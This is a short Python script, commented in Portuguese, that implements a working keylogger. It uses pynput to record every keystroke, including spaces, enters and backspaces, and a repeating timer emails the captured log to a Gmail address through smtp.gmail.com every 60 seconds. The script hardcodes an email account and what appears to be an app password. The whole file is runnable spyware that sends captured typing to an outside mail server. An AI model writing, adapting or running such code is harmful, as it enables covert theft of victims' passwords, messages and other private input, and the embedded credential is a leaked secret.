from email.mime.multipart import MIMEMultipart

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#1. Configurando o e-mail
EMAIL_ORIGEM = "testekeylogger@gmail.com"
EMAIL_DESTINO = "testekeylogger@gmail.com"
SENHA_EMAIL = "vbee klmnn oipp kjnn"

#2. Criando o envio de email
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados"
        msg['FROM'] = EMAIL_ORIGEM
        msg['TO'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    #Tempo de envio: 60 segundos
    Timer(60, enviar_email).start()

#3. Capturar os dados digitados
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass

#Inicia o keylogger e o envio
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()